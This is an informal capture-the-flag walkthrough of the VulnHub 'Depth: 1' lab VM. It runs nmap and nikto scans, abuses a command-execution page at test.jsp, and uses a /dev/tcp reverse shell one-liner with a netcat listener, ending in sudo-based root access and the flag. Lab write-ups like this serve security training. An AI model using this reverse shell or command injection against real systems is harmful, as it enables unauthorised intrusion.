# DEPT1

lets begin dig in,,,,,,,,,,,,,,,,

About Release
Back to the Top
Name: Depth: 1
Date release: 27 Oct 2017
Author: Dan Lawson
Series: Depth
Web page: https://depthsecurity-my.sharepoint.com/personal/dlawson_depthsecurity_com/_layouts/15/guestaccess.aspx?docid=1ed416c7a2c4640c3bc2bfcb64e5a9823&authkey=AYzxAjGDCvY90H355bLzTTo
Description
Back to the Top
Many times while conducting a pentest, I need to script something up to make my life easier or to quickly test an attack idea or vector. Recently I came across an interesting command injection vector on a web application sitting on a client's internet-facing estate. There was a page, running in Java, that allowed me to type arbitrary commands into a form, and have it execute them. While developer-provided webshells are always nice, there were a few caveats. The page was expecting directory listing style output, which was then parsed and reformatted. If the output didn't match this parsing, no output to me. Additionally, there was no egress. ICMP, and all TCP/UDP ports including DNS were blocked outbound.

I was still able to leverage the command injection to compromise not just the server, but the entire infrastructure it was running on. After the dust settled, the critical report was made, and the vulnerability was closed, I thought the entire attack path was kind of fun, and decided to share how I went about it. Since I enjoy being a free man and only occasionally visit prisons, I've created a simple boot2root style VM that has a similar set of vulnerabilities to use in a walkthrough.

MD5: 47975764E3A6AAD07749C35072C1B025
SHA1: 6516163F84ACDDD846981C94262EC3538A18970E


lets begin enumeration::::::
  nmap_------
  # Nmap 7.94SVN scan initiated Sun Sep 15 13:14:16 2024 as: nmap -sV -sC -Pn -oN nmap 192.168.73.144
Nmap scan report for 192.168.73.144
Host is up (0.00024s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
MAC Address: 00:0C:29:29:4E:C1 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 15 13:14:32 2024 -- 1 IP address (1 host up) scanned in 16.11 seconds

 
 
 
 
 
 ***NIKTO  is a pluggable web server and CGI scanner written in Perl, using rfp’s LibWhisker to perform fast security or informational checks.




nikto -h http://192.168.73.144:8080/


- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.73.144
+ Target Hostname:    192.168.73.144
+ Target Port:        8080
+ Start Time:         2024-09-16 01:57:30 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a differe: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /manager/html: Default Tomcat Manager / Host Manager interface found.
+ /test.jsp: This might be interesting.
+ /manager/status: Default Tomcat Server Status interface found.
+ 8254 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2024-09-16 01:57:45 (GMT5.5) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



 /test.jsp: This might be interesting.  might hide something so search it on url as http://192.168.73.144:8080/test.jsp

 
 listing out for user name
 
 Command: ls -l /home

Owner	Group	Size	Filename
bill 	bill 	4096 	bill


 so then i list out the tmp folder
 
 
 Command: ls -l /tmp

Owner	Group	Size	Filename
tomcat8 	tomcat8 	4096 	hsperfdata_tomcat8
root 	root 	4096 	systemd-private-70a6d11547824f1ba12a1cc1dd61b2af-systemd-resolved.service-W9Wr87
root 	root 	4096 	systemd-private-70a6d11547824f1ba12a1cc1dd61b2af-systemd-timesyncd.service-yZfQxx
tomcat8 	root 	4096 	tomcat8-tomcat8-tmp
root 	root 	4096 	vmware-root 



no-w i've to generate reverse shell using reverse shell genaretor:::::::
ssh bill@localhost sudo bash -i >& /dev/tcp/192.168.73.129/4242 0>&1  {get it form online reverse shell generator}
using netcat  for nc -lvp 4242

::::::::getting the shell:::Boooooyahhhhhhhhhh:""""::: 


THEn i simply use sudo -l for take a look on permissions 
Matching Defaults entries for root on b2r:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on b2r:
    (ALL : ALL) ALL
root@b2r:~# sudo  su 
then go to that root folder
the i successfully get the flag
which is ::
::::::::::::::::::::::::::::::flag{WellThatWasEasy}:::::::::::::::::::::::::::::

 that's went quiet  easy DEPTH1---VULNHUB





  
















